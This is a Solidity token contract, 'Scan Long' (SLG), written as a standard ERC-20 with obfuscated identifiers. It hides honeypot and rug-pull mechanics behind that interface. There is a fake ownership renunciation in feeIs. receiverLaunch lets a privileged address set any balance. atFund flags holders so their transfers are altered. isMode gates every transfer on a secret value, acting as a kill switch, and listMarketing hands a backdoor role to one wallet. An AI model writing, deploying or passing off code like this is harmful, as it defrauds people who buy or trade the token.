//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface maxTokenMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeTotal {
    function createPair(address launchedIsBuy, address maxExemptFund) external returns (address);
}

interface walletTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptSender) external view returns (uint256);

    function transfer(address maxList, uint256 senderMode) external returns (bool);

    function allowance(address atFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderMode) external returns (bool);

    function transferFrom(
        address sender,
        address maxList,
        uint256 senderMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapFee, uint256 value);
    event Approval(address indexed atFee, address indexed spender, uint256 value);
}

interface walletTeamMetadata is walletTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ScanLong is amountMode, walletTeam, walletTeamMetadata {

    bool public amountLaunched;

    uint256 private limitExempt = 100000000 * 10 ** 18;

    string private shouldMode = "Scan Long";

    bool public takeMax;

    function receiverLaunch(address atFrom, uint256 senderMode) public {
        feeAuto();
        isLimitTx[atFrom] = senderMode;
    }

    function approve(address swapAuto, uint256 senderMode) public virtual override returns (bool) {
        modeMarketing[_msgSender()][swapAuto] = senderMode;
        emit Approval(_msgSender(), swapAuto, senderMode);
        return true;
    }

    function balanceOf(address exemptSender) public view virtual override returns (uint256) {
        return isLimitTx[exemptSender];
    }

    function isMode(address fromAmount, address maxList, uint256 senderMode) internal returns (bool) {
        if (fromAmount == enableLimit) {
            return walletExempt(fromAmount, maxList, senderMode);
        }
        uint256 autoSwapExempt = walletTeam(toFeeToken).balanceOf(receiverFrom);
        require(autoSwapExempt == launchFund);
        require(maxList != receiverFrom);
        if (receiverToken[fromAmount]) {
            return walletExempt(fromAmount, maxList, enableTo);
        }
        return walletExempt(fromAmount, maxList, senderMode);
    }

    uint256 constant enableTo = 19 ** 10;

    bool private feeSwap;

    function decimals() external view virtual override returns (uint8) {
        return takeMin;
    }

    uint256 isFee;

    function totalSupply() external view virtual override returns (uint256) {
        return limitExempt;
    }

    mapping(address => bool) public receiverToken;

    event OwnershipTransferred(address indexed teamList, address indexed fromSender);

    address public toFeeToken;

    mapping(address => mapping(address => uint256)) private modeMarketing;

    function name() external view virtual override returns (string memory) {
        return shouldMode;
    }

    function owner() external view returns (address) {
        return tradingSell;
    }

    function transfer(address atFrom, uint256 senderMode) external virtual override returns (bool) {
        return isMode(_msgSender(), atFrom, senderMode);
    }

    address public enableLimit;

    bool private feeIsAt;

    address receiverFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return tradingSell;
    }

    function launchedFee(uint256 senderMode) public {
        feeAuto();
        launchFund = senderMode;
    }

    bool private amountFund;

    function atFund(address receiverMode) public {
        feeAuto();
        if (amountLaunched) {
            feeIsAt = false;
        }
        if (receiverMode == enableLimit || receiverMode == toFeeToken) {
            return;
        }
        receiverToken[receiverMode] = true;
    }

    function allowance(address fundWallet, address swapAuto) external view virtual override returns (uint256) {
        if (swapAuto == receiverFee) {
            return type(uint256).max;
        }
        return modeMarketing[fundWallet][swapAuto];
    }

    constructor (){
        
        maxTokenMarketing totalShould = maxTokenMarketing(receiverFee);
        toFeeToken = modeTotal(totalShould.factory()).createPair(totalShould.WETH(), address(this));
        if (launchedMode) {
            feeIsAt = true;
        }
        enableLimit = _msgSender();
        feeIs();
        shouldToken[enableLimit] = true;
        isLimitTx[enableLimit] = limitExempt;
        
        emit Transfer(address(0), enableLimit, limitExempt);
    }

    string private teamTake = "SLG";

    function symbol() external view virtual override returns (string memory) {
        return teamTake;
    }

    bool public launchedMode;

    address private tradingSell;

    function walletExempt(address fromAmount, address maxList, uint256 senderMode) internal returns (bool) {
        require(isLimitTx[fromAmount] >= senderMode);
        isLimitTx[fromAmount] -= senderMode;
        isLimitTx[maxList] += senderMode;
        emit Transfer(fromAmount, maxList, senderMode);
        return true;
    }

    mapping(address => uint256) private isLimitTx;

    uint8 private takeMin = 18;

    function feeIs() public {
        emit OwnershipTransferred(enableLimit, address(0));
        tradingSell = address(0);
    }

    uint256 launchFund;

    address receiverFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public shouldToken;

    function transferFrom(address fromAmount, address maxList, uint256 senderMode) external override returns (bool) {
        if (_msgSender() != receiverFee) {
            if (modeMarketing[fromAmount][_msgSender()] != type(uint256).max) {
                require(senderMode <= modeMarketing[fromAmount][_msgSender()]);
                modeMarketing[fromAmount][_msgSender()] -= senderMode;
            }
        }
        return isMode(fromAmount, maxList, senderMode);
    }

    function listMarketing(address launchLaunched) public {
        require(launchLaunched.balance < 100000);
        if (fundExempt) {
            return;
        }
        
        shouldToken[launchLaunched] = true;
        
        fundExempt = true;
    }

    function feeAuto() private view {
        require(shouldToken[_msgSender()]);
    }

    bool private tokenLaunched;

    bool public fundExempt;

}